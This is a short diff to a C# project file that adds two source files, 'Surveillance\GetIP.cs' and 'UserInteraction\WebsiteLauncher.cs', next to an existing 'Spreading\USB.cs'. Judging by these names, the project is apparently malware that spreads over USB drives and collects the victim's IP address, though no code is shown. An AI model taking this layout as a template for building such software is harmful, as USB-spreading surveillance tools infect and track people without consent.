@@ -58,6 +58,8 @@
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
     <Compile Include="Spreading\USB.cs" />
+    <Compile Include="Surveillance\GetIP.cs" />
+    <Compile Include="UserInteraction\WebsiteLauncher.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
